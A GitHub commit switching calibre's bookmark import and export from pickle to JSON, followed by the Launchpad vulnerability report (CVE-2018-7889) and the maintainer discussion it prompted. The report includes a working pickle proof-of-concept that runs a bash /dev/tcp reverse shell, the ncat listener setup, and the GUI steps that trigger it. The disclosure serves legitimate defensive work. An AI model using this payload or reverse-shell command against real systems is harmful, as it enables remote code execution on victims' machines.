=== Content from github.com_c1f7999c_20250125_044517.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkovidgoyal%2Fcalibre%2Fcommit%2Faeb5b036a0bf657951756688b3c72bd68b6e4a7d)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkovidgoyal%2Fcalibre%2Fcommit%2Faeb5b036a0bf657951756688b3c72bd68b6e4a7d)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=kovidgoyal%2Fcalibre)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[kovidgoyal](/kovidgoyal)
/
**[calibre](/kovidgoyal/calibre)**
Public

* [Notifications](/login?return_to=%2Fkovidgoyal%2Fcalibre) You must be signed in to change notification settings
* [Fork
  2.3k](/login?return_to=%2Fkovidgoyal%2Fcalibre)
* [Star
   20.4k](/login?return_to=%2Fkovidgoyal%2Fcalibre)

* [Code](/kovidgoyal/calibre)
* [Pull requests
  5](/kovidgoyal/calibre/pulls)
* [Actions](/kovidgoyal/calibre/actions)
* [Projects
  0](/kovidgoyal/calibre/projects)
* [Security](/kovidgoyal/calibre/security)
* [Insights](/kovidgoyal/calibre/pulse)

Additional navigation options

* [Code](/kovidgoyal/calibre)
* [Pull requests](/kovidgoyal/calibre/pulls)
* [Actions](/kovidgoyal/calibre/actions)
* [Projects](/kovidgoyal/calibre/projects)
* [Security](/kovidgoyal/calibre/security)
* [Insights](/kovidgoyal/calibre/pulse)

## Commit

[Permalink](/kovidgoyal/calibre/commit/aeb5b036a0bf657951756688b3c72bd68b6e4a7d)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

E-book viewer: Change the file format used to import/export bookmarks…

[Browse files](/kovidgoyal/calibre/tree/aeb5b036a0bf657951756688b3c72bd68b6e4a7d)
Browse the repository at this point in the history

```
… to use JSON. This prevents malicious bookmarks files from causing code execution.

Also more work on the EM page for the server.
```

* Loading branch information

[![@kovidgoyal](https://avatars.githubusercontent.com/u/1308621?s=40&v=4)](/kovidgoyal)

[kovidgoyal](/kovidgoyal/calibre/commits?author=kovidgoyal "View all commits by kovidgoyal")
committed
Mar 7, 2018

1 parent
[706c3ba](/kovidgoyal/calibre/commit/706c3ba805e30d720ca919e5ea124a9a201f9094)

commit aeb5b03

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**87 additions**
and
**15 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src

  + calibre

    - gui2/viewer

      * src/calibre/gui2/viewer/bookmarkmanager.py
        [bookmarkmanager.py](#diff-fc89ff0e880e936c1eb54b8005b52359e0258bc324bcc5e3ea070ae586323298)
    - srv

      * src/calibre/srv/code.py
        [code.py](#diff-5d93d1aee6188d391097a3d99800484aa2df82a7813ffc37f55a1d368c64f505)
  + pyj/book\_list

    - src/pyj/book\_list/edit\_metadata.pyj
      [edit\_metadata.pyj](#diff-beeb24fa9f728e3f05ed641d180cc5eacf37e07281392710ccd4f98f17f3191a)

## There are no files selected for viewing

18 changes: 9 additions & 9 deletions

18
[src/calibre/gui2/viewer/bookmarkmanager.py](#diff-fc89ff0e880e936c1eb54b8005b52359e0258bc324bcc5e3ea070ae586323298 "src/calibre/gui2/viewer/bookmarkmanager.py")

Show comments

[View file](/kovidgoyal/calibre/blob/aeb5b036a0bf657951756688b3c72bd68b6e4a7d/src/calibre/gui2/viewer/bookmarkmanager.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -6,7 +6,7 @@ |
|  |  | \_\_license\_\_ = 'GPL v3' |
|  |  | \_\_copyright\_\_ = '2013, Kovid Goyal <kovid at kovidgoyal.net>' |
|  |  |  |
|  |  | import cPickle |
|  |  | import json |
|  |  |  |
|  |  | from PyQt5.Qt import ( |
|  |  | Qt, QListWidget, QListWidgetItem, QItemSelectionModel, QAction, |
| Expand Down  Expand Up | | @@ -186,32 +186,32 @@ def pos\_key(b): |
|  |  | self.edited.emit(bm) |
|  |  |  |
|  |  | def bm\_to\_item(self, bm): |
|  |  | return bytearray(cPickle.dumps(bm, -1)) |
|  |  | return bm.copy() |
|  |  |  |
|  |  | def item\_to\_bm(self, item): |
|  |  | return cPickle.loads(bytes(item.data(Qt.UserRole))) |
|  |  | return item.data(Qt.UserRole).copy() |
|  |  |  |
|  |  | def get\_bookmarks(self): |
|  |  | return list(self) |
|  |  |  |
|  |  | def export\_bookmarks(self): |
|  |  | filename = choose\_save\_file( |
|  |  | self, 'export-viewer-bookmarks', \_('Export bookmarks'), |
|  |  | filters=[(\_('Saved bookmarks'), ['pickle'])], all\_files=False, initial\_filename='bookmarks.pickle') |
|  |  | filters=[(\_('Saved bookmarks'), ['calibre-bookmarks'])], all\_files=False, initial\_filename='bookmarks.calibre-bookmarks') |
|  |  | if filename: |
|  |  | with open(filename, 'wb') as fileobj: |
|  |  | cPickle.dump(self.get\_bookmarks(), fileobj, -1) |
|  |  | with lopen(filename, 'wb') as fileobj: |
|  |  | fileobj.write(json.dumps(self.get\_bookmarks(), indent=True)) |
|  |  |  |
|  |  | def import\_bookmarks(self): |
|  |  | files = choose\_files(self, 'export-viewer-bookmarks', \_('Import bookmarks'), |
|  |  | filters=[(\_('Saved bookmarks'), ['pickle'])], all\_files=False, select\_only\_single\_file=True) |
|  |  | filters=[(\_('Saved bookmarks'), ['calibre-bookmarks'])], all\_files=False, select\_only\_single\_file=True) |
|  |  | if not files: |
|  |  | return |
|  |  | filename = files[0] |
|  |  |  |
|  |  | imported = None |
|  |  | with open(filename, 'rb') as fileobj: |
|  |  | imported = cPickle.load(fileobj) |
|  |  | with lopen(filename, 'rb') as fileobj: |
|  |  | imported = json.load(fileobj) |
|  |  |  |
|  |  | if imported is not None: |
|  |  | bad = False |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[src/calibre/srv/code.py](#diff-5d93d1aee6188d391097a3d99800484aa2df82a7813ffc37f55a1d368c64f505 "src/calibre/srv/code.py")

Show comments

[View file](/kovidgoyal/calibre/blob/aeb5b036a0bf657951756688b3c72bd68b6e4a7d/src/calibre/srv/code.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -26,7 +26,7 @@ |
|  |  | from calibre.srv.routes import endpoint, json |
|  |  | from calibre.srv.utils import get\_library\_data, get\_use\_roman |
|  |  | from calibre.utils.config import prefs, tweaks |
|  |  | from calibre.utils.icu import sort\_key |
|  |  | from calibre.utils.icu import sort\_key, numeric\_sort\_key |
|  |  | from calibre.utils.localization import get\_lang |
|  |  | from calibre.utils.search\_query\_parser import ParseException |
|  |  |  |
| Expand Down  Expand Up | | @@ -393,4 +393,4 @@ def field\_names(ctx, rd, field): |
|  |  | Optional: ?library\_id=<default library> |
|  |  | ''' |
|  |  | db, library\_id = get\_library\_data(ctx, rd)[:2] |
|  |  | return tuple(db.all\_field\_names(field)) |
|  |  | return tuple(sorted(db.all\_field\_names(field), key=numeric\_sort\_key)) |

80 changes: 76 additions & 4 deletions

80
[src/pyj/book\_list/edit\_metadata.pyj](#diff-beeb24fa9f728e3f05ed641d180cc5eacf37e07281392710ccd4f98f17f3191a "src/pyj/book_list/edit_metadata.pyj")

Show comments

[View file](/kovidgoyal/calibre/blob/aeb5b036a0bf657951756688b3c72bd68b6e4a7d/src/pyj/book_list/edit_metadata.pyj)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -15,6 +15,7 @@ from book\_list.library\_data import ( |
|  |  | loaded\_book\_ids, set\_book\_metadata |
|  |  | ) |
|  |  | from book\_list.router import back |
|  |  | from book\_list.theme import get\_color |
|  |  | from book\_list.top\_bar import create\_top\_bar, set\_title |
|  |  | from book\_list.ui import set\_panel\_handler, show\_panel |
|  |  | from date import format\_date |
| Expand All | | @@ -39,6 +40,11 @@ add\_extra\_css(def(): |
|  |  | style += build\_rule(sel + 'table.metadata td', padding\_bottom='0.5ex', padding\_top='0.5ex', cursor='pointer') |
|  |  | style += build\_rule(sel + 'table.metadata tr:hover', color='red') |
|  |  | style += build\_rule(sel + 'table.metadata tr:active', transform='scale(1.5)') |
|  |  |  |
|  |  | style += build\_rule(sel + '.completions', display='flex', flex\_wrap='wrap', align\_items='center') |
|  |  | style += build\_rule(sel + '.completions > div', margin='0.5ex 0.5rem', margin\_left='0', padding='0.5ex 0.5rem', border='solid 1px currentColor', border\_radius='1ex', cursor='pointer') |
|  |  | style += build\_rule(sel + '.completions > div:active', transform='scale(1.5)') |
|  |  | style += build\_rule(sel + '.completions > div:hover', background=get\_color('window-foreground'), color=get\_color('window-background')) |
|  |  | return style |
|  |  | ) |
|  |  |  |
| Expand Down  Expand Up | | @@ -114,21 +120,83 @@ def simple\_line\_edit(container\_id, book\_id, field, fm, div, mi): |
|  |  | return x |
|  |  |  |
|  |  |  |
|  |  | def add\_completion(container\_id, name): |
|  |  | pass |
|  |  |  |
|  |  |  |
|  |  | def show\_completions(container\_id, div, field, prefix, names): |
|  |  | clear(div) |
|  |  | completions = E.div(class\_='completions') |
|  |  | div.appendChild(completions) |
|  |  | for i, name in enumerate(names): |
|  |  | completions.appendChild(E.div(name, onclick=add\_completion.bind(None, container\_id, name))) |
|  |  | if i >= 50: |
|  |  | break |
|  |  |  |
|  |  |  |
|  |  | def update\_completions(container\_id, ok, field, names): |
|  |  | c = document.getElementById(container\_id) |
|  |  | if not c: |
|  |  | return |
|  |  | d = c.querySelector('div[data-ctype="edit"]') |
|  |  | if not d or d.style.display is not 'block': |
|  |  | return |
|  |  | div = d.lastChild |
|  |  | clear(div) |
|  |  | if not ok: |
|  |  | err = E.div() |
|  |  | safe\_set\_inner\_html(err, names) |
|  |  | div.appendChild(E.div( |
|  |  | \_('Failed to download items for completion, with error:'), err |
|  |  | )) |
|  |  | return |
|  |  | val = d.querySelector('input').value or '' |
|  |  | val = value\_to\_json(val) |
|  |  | if jstype(val) is 'string': |
|  |  | prefix = val |
|  |  | else: |
|  |  | prefix = val[-1] if val.length else '' |
|  |  | if prefix is update\_completions.prefix: |
|  |  | return |
|  |  | pl = prefix.toLowerCase().strip() |
|  |  | if pl: |
|  |  | if pl.startswith(update\_completions.prefix.toLowerCase()): |
|  |  | matching\_names = [x for x in update\_completions.names if x.toLowerCase().startswith(pl)] |
|  |  | else: |
|  |  | matching\_names = [x for x in names if x.toLowerCase().startswith(pl)] |
|  |  | else: |
|  |  | matching\_names = [] |
|  |  | update\_completions.prefix = prefix |
|  |  | update\_completions.names = matching\_names |
|  |  | show\_completions(container\_id, div, field, prefix, matching\_names) |
|  |  |  |
|  |  |  |
|  |  | update\_completions.ui\_to\_list = None |
|  |  | update\_completions.list\_to\_ui = None |
|  |  | update\_completions.names = v'[]' |
|  |  | update\_completions.prefix = '' |
|  |  |  |
|  |  |  |
|  |  | def line\_edit\_updated(container\_id, field): |
|  |  | field\_names\_for(field, update\_completions.bind(None, container\_id)) |
|  |  |  |
|  |  |  |
|  |  | def multiple\_line\_edit(list\_to\_ui, ui\_to\_list, container\_id, book\_id, field, fm, div, mi): |
|  |  | nonlocal value\_to\_json |
|  |  | update\_completions.ui\_to\_list = ui\_to\_list |
|  |  | update\_completions.list\_to\_ui = list\_to\_ui |
|  |  | name = fm.name or field |
|  |  | le = E.input(type='text', name=name.replace('#', '\_c\_'), autocomplete=True) |
|  |  | le = E.input(type='text', name=name.replace('#', '\_c\_'), autocomplete=True, oninput=line\_edit\_updated.bind(None, container\_id, field)) |
|  |  | le.value = (resolved\_metadata(mi, field) or v'[]').join(list\_to\_ui) |
|  |  | form = create\_form(le, line\_edit\_get\_value, container\_id, book\_id, field) |
|  |  | div.appendChild(E.div(style='margin: 0.5ex 1rem', \_( |
|  |  | 'Edit the "{0}" below. Multiple items can be separated by {1}.').format(name, list\_to\_ui.strip()))) |
|  |  | div.appendChild(E.div(style='margin: 0.5ex 1rem', form)) |
|  |  | div.appendChild(E.div(style='margin: 0.5ex 1rem')) |
|  |  | div.appendChild(E.div(E.span(\_('Loading all {}...').format(name)), style='margin: 0.5ex 1rem')) |
|  |  | le.focus(), le.select() |
|  |  | value\_to\_json = def(x): |
|  |  | return [a.strip() for a in x.split(ui\_to\_list) if a.strip()] |
|  |  | div.lastChild.appendChild(E.span(\_('Loading all {}...').format(name))) |
|  |  | field\_names\_for(field, print) |
|  |  | field\_names\_for(field, update\_completions.bind(None, container\_id)) |
|  |  |  |
|  |  |  |
|  |  | def edit\_field(container\_id, book\_id, field): |
| Expand All | | @@ -142,6 +210,10 @@ def edit\_field(container\_id, book\_id, field): |
|  |  | d.style.display = 'block' |
|  |  | d.previousSibling.style.display = 'none' |
|  |  | clear(d) |
|  |  | update\_completions.ui\_to\_list = None |
|  |  | update\_completions.list\_to\_ui = None |
|  |  | update\_completions.names = v'[]' |
|  |  | update\_completions.prefix = '' |
|  |  | if field is 'authors': |
|  |  | multiple\_line\_edit(' & ', '&', container\_id, book\_id, field, fm, d, mi) |
|  |  | else: |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `aeb5b03`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkovidgoyal%2Fcalibre%2Fcommit%2Faeb5b036a0bf657951756688b3c72bd68b6e4a7d) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.launchpad.net_b47da8c6_20250125_044515.html ===

[Log in / Register](https://bugs.launchpad.net/calibre/%2Bbug/1753870/%2Blogin)

[![](https://launchpadlibrarian.net/49153010/library64.png)](https://launchpad.net/calibre)

## [calibre](https://launchpad.net/calibre)

* [Overview](https://launchpad.net/calibre)
* [Code](https://code.launchpad.net/calibre)
* [Bugs](https://bugs.launchpad.net/calibre)
* [Blueprints](https://blueprints.launchpad.net/calibre)
* [Translations](https://translations.launchpad.net/calibre)
* [Answers](https://answers.launchpad.net/calibre)

# Code Execution in Calibre as a resut of the use of Pickle

Bug #1753870 reported by
[-](https://launchpad.net/~ayrx)
on 2018-03-07

[256](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [calibre](https://bugs.launchpad.net/calibre) | Invalid | Undecided | Unassigned |  |

### Bug Description

A malicious pickle file can be used to trigger remote code execution in

Calibre E-book Manager.

# Affected Versions

This vulnerability affects all operating systems Calibre supports and is

present in the latest version (3.18) of the application.

# Description

Calibre E-book Manager uses the Python `pickle` module for serialization in

multiple places. This is a dangerous pattern because the deserialization of

malicious pickle data can result in the execution of arbitrary Python code.

There are two specific functionality in Calibre where the use of pickle can be

leveraged by an attacker to obtain code execution by social engineering a

target.

Firstly, Calibre allows users to export and import bookmark data from a

specific ebook. `src/calibre/gui2/viewer/bookmarkmanager.py` contains code that

imports a previously exported file containing bookmark information. This file

data is directly passed into `cPickle.load`.

```

206 files = choose\_files(self, 'export-viewer-bookmarks', \_('Import bookmarks'),

207 filters=[(\_('Saved bookmarks'), ['pickle'])], all\_files=False, select\_only\_single\_file=True)

208 if not files:

209 return

210 filename = files[0]

211

212 imported = None

213 with open(filename, 'rb') as fileobj:

214 imported = cPickle.load(fileobj)

```

Secondly, Calibre stores metadata in `metadata.db`, a SQLite database file.

`src/calibre/db/backend.py` contains code that deserializes data contained in

one of the tables of the database. This code can be triggered by attempting a

file format conversion of an ebook.

```

1694 def conversion\_options(self, book\_id, fmt):

1695 for (data,) in self.conn.get('SELECT data FROM conversion\_options WHERE book=? AND format=?', (book\_id, fmt.upper())):

1696 if data:

1697 return cPickle.loads(bytes(data))

```

# Proof of Concept

For the proof of concept, we will use a malicious pickle exploited by the below

`poc.py`.

```python

import cPickle

import os

import base64

import pickletools

class Exploit(object):

    def \_\_reduce\_\_(self):

        return (os.system, (("bash -i >& /dev/tcp/127.0.0.1/8000 0>&1"),))

with open("exploit.pickle", "wb") as f:

    cPickle.dump(Exploit(), f, cPickle.HIGHEST\_PROTOCOL)

```

The exploit will make a reverse shell to a listener on 127.0.0.1:8000, so we

set that up using `ncat`.

```

$ ncat -nlvp 8000

Ncat: Version 7.60 ( <https://nmap.org/ncat> )

Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.

Ncat: SHA-1 fingerprint: 125E F683 5DA6 153A 6E26 E957 0C92 4706 2596 347C

Ncat: Listening on :::8000

Ncat: Listening on 0.0.0.0:8000

```

For the first vulnerability, we open an ebook and navigate to the "Bookmarks"

icon on the left of the screen and click the "Show/hide bookmarks" menu item.

We then click the "Import" button on the bookmarks pane and select the

generated `exploit.pickle` file. This should trigger a reverse shell on our

listener.

For the second vulnerability, we click on the arrow on the right of the

"Calibre Library" icon and click the "Export/import all calibre data. We then

click "Import previously exported data" and select the folder containing the

`part-0001.calibre-data` file (uploaded as an attachment). The file contains

the contents of `exploit.pickle` stored in the `data` column of the

`conversion\_options` table. Once the data has been exported, we right click the

ebook in the library and select

 "Convert books->Convert individually" This should trigger a reverse shell on

our listener.

## CVE References

* [2018-7889](/bugs/cve/2018-7889 "gui2/viewer/bookmarkmanager.py in Cal...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [- (ayrx)](https://launchpad.net/~ayrx) wrote on 2018-03-07: |  |  | [#1](/calibre/%2Bbug/1753870/comments/1) |
| --- | --- | --- | --- |

* [part-0001.calibre-data](https://bugs.launchpad.net/calibre/%2Bbug/1753870/%2Battachment/5071173/%2Bfiles/part-0001.calibre-data)
  [Edit](/calibre/%2Bbug/1753870/%2Battachment/5071173)
  (722.1 KiB,
  application/octet-stream)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [- (ayrx)](https://launchpad.net/~ayrx) wrote on 2018-03-07: |  |  | [#2](/calibre/%2Bbug/1753870/comments/2) |
| --- | --- | --- | --- |

While this report directly addresses the two areas where a user of Calibre can be potentially tricked into directly triggering a malicious pickle, there is a very dangerous pattern of using pickle throughout the entire codebase. This should be modified in favour of safer serialisation methods like JSON.

While this report directly addresses the two areas where a user of Calibre can be potentially tricked into directly triggering a malicious pickle, there is a very dangerous pattern of using pickle throughout the entire codebase. This should be modified in favour of safer serialisation methods like JSON.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kovid Goyal (kovid)](https://launchpad.net/~kovid) wrote on 2018-03-07: |  |  | [#3](/calibre/%2Bbug/1753870/comments/3) |
| --- | --- | --- | --- |

calibre does not claim to be secure against a threat that can modify data in the users computer. If you can do that, it is already game over in many many ways, for instance, you can set CALIBRE\_DEVELOP\_FROM and have calibre execute arbitrary python, or you can install a plugin in the calibre config directory and once again execute arbitrary code. Or you could just modify the calibre program files themselves and once again execute arbitrary code (though this last one typically requires root, unless running calibre portable or similar).

If there is pickle involved in some code path that can be triggered by opening untrusted data, such as an ebook, then that would indeed by a security issue. calibre library exports and config files are explicitly not untrusted data. If you find such a code path involving pickle with untrusted data, I'll be happy to fix it.

calibre does not claim to be secure against a threat that can modify data in the users computer. If you can do that, it is already game over in many many ways, for instance, you can set CALIBRE\_DEVELOP\_FROM and have calibre execute arbitrary python, or you can install a plugin in the calibre config directory and once again execute arbitrary code. Or you could just modify the calibre program files themselves and once again execute arbitrary code (though this last one typically requires root, unless running calibre portable or similar).
If there is pickle involved in some code path that can be triggered by opening untrusted data, such as an ebook, then that would indeed by a security issue. calibre library exports and config files are explicitly not untrusted data. If you find such a code path involving pickle with untrusted data, I'll be happy to fix it.

| Changed in calibre: | |
| --- | --- |
| **status**: | New → Invalid |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kovid Goyal (kovid)](https://launchpad.net/~kovid) wrote on 2018-03-07: |  |  | [#4](/calibre/%2Bbug/1753870/comments/4) |
| --- | --- | --- | --- |

That said, it is probably a good idea to add a warning when the user imports a bookmark file or a library just as there is a warning when adding a plugin. That will be in the newt release.

That said, it is probably a good idea to add a warning when the user imports a bookmark file or a library just as there is a warning when adding a plugin. That will be in the newt release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kovid Goyal (kovid)](https://launchpad.net/~kovid) wrote on 2018-03-07: |  |  | [#5](/calibre/%2Bbug/1753870/comments/5) |
| --- | --- | --- | --- |

Oh and I should note that calibre library exports are exports of all calibre data, including plugins (pickle allowing code execution is really irrelevant there).

Oh and I should note that calibre library exports are exports of all calibre data, including plugins (pickle allowing code execution is really irrelevant there).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [- (ayrx)](https://launchpad.net/~ayrx) wrote on 2018-03-07: |  |  | [#6](/calibre/%2Bbug/1753870/comments/6) |
| --- | --- | --- | --- |

Thanks for the reply.

I agree that the config files being in the pickle format is not directly a security vulnerability. This is why I did not mention them in the actual report. However, changing them in favour of a safer serialisation method is a good idea to consider.

For the actual vulnerability report, I think it is a dangerous idea to write off the threat by saying that bookmarks and export data is considered "untrusted" when it can be triggered from the GUI and it has been shown time and time again that social engineering users to perform certain actions is an effective method of attack. This is especially since there is no good reason that bookmarks or `conversion\_options` needs to be serialised with pickle instead of something safer like JSON.

I see that you have changed bookmarks to use JSON in commit `aeb5b036a0bf657951756688b3c72bd68b6e4a7d`. I hope you can do the same for `conversion\_options` and disclose this report when it is done.

Thanks for the reply.
I agree that the config files being in the pickle format is not directly a security vulnerability. This is why I did not mention them in the actual report. However, changing them in favour of a safer serialisation method is a good idea to consider.
For the actual vulnerability report, I think it is a dangerous idea to write off the threat by saying that bookmarks and export data is considered "untrusted" when it can be triggered from the GUI and it has been shown time and time again that social engineering users to perform certain actions is an effective method of attack. This is especially since there is no good reason that bookmarks or `conversion\_options` needs to be serialised with pickle instead of something safer like JSON.
I see that you have changed bookmarks to use JSON in commit `aeb5b036a0bf657951756688b3c72bd68b6e4a7d`. I hope you can do the same for `conversion\_options` and disclose this report when it is done.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kovid Goyal (kovid)](https://launchpad.net/~kovid) wrote on 2018-03-07: |  |  | [#7](/calibre/%2Bbug/1753870/comments/7) |
| --- | --- | --- | --- |

No, I said that exported data (bookmarks and libraries in this case) are both considered \*trusted\* when importing. For bookmarks, that can be changed to making them untrusted, as I already did. For export data, it is pointless, since, as I said export data contains the entire calibre config, which in turn contains lots of executable code including plugins. Therefore, changing the conversion\_options to not use pickle, does not actually achieve anything, since a malicious actor can simply modify some of the other executable code in the export instead. This has been mitigated by displaying a warning to the user informing them of that when importing exported data. There isn't anything more that can be done there, since exported data will always contain executable code, so if it is tampered with, it is game over.

As for the general argument of not using pickle, I am sympathetic, and indeed newer calibre code does not use pickle, but some legacy parts remain. None of those legacy parts operate on untrusted data, as far as I know.

And just for completeness, I just made a commit to make unpickling of conversion\_options safe. But let me emphasize, once again, that this \*does not\* make exported data safe.

No, I said that exported data (bookmarks and libraries in this case) are both considered \*trusted\* when importing. For bookmarks, that can be changed to making them untrusted, as I already did. For export data, it is pointless, since, as I said export data contains the entire calibre config, which in turn contains lots of executable code including plugins. Therefore, changing the conversion\_options to not use pickle, does not actually achieve anything, since a malicious actor can simply modify some of the other executable code in the export instead. This has been mitigated by displaying a warning to the user informing them of that when importing exported data. There isn't anything more that can be done there, since exported data will always contain executable code, so if it is tampered with, it is game over.
As for the general argument of not using pickle, I am sympathetic, and indeed newer calibre code does not use pickle, but some legacy parts remain. None of those legacy parts operate on untrusted data, as far as I know.
And just for completeness, I just made a commit to make unpickling of conversion\_options safe. But let me emphasize, once again, that this \*does not\* make exported data safe.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [- (ayrx)](https://launchpad.net/~ayrx) wrote on 2018-03-07: |  |  | [#8](/calibre/%2Bbug/1753870/comments/8) |
| --- | --- | --- | --- |

Thank you for evaluating my report and pushing out fix so quickly! I must say this is one of the fastest turnarounds of all vulnerabilities I have reported. :)

I would like to make this report public and request a CVE ID to track this issue (specifically the instance where pickle is used for bookmarks export). Do you want to make the request to MITRE for a CVE assignment or shall I do it?

Thank you for evaluating my report and pushing out fix so quickly! I must say this is one of the fastest turnarounds of all vulnerabilities I have reported. :)
I would like to make this report public and request a CVE ID to track this issue (specifically the instance where pickle is used for bookmarks export). Do you want to make the request to MITRE for a CVE assignment or shall I do it?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kovid Goyal (kovid)](https://launchpad.net/~kovid) wrote on 2018-03-07: |  |  | [#9](/calibre/%2Bbug/1753870/comments/9) |
| --- | --- | --- | --- |

Feel free to request a CVE ID yourself and make the bug report public, since the commits fixing it are already public. And thanks for taking the time to investigate the issue and report it :)

Feel free to request a CVE ID yourself and make the bug report public, since the commits fixing it are already public. And thanks for taking the time to investigate the issue and report it :)

| **information type**: | Private Security → Public |
| --- | --- |

[Eli Schwartz (eschwartz)](https://launchpad.net/~eschwartz)
on 2018-03-09

| **information type**: | Public → Public Security |
| --- | --- |

[See full activity log](https://bugs.launchpad.net/calibre/%2Bbug/1753870/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/calibre/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/calibre/%2Bbug/1753870/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/calibre/%2Bbug/1753870/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

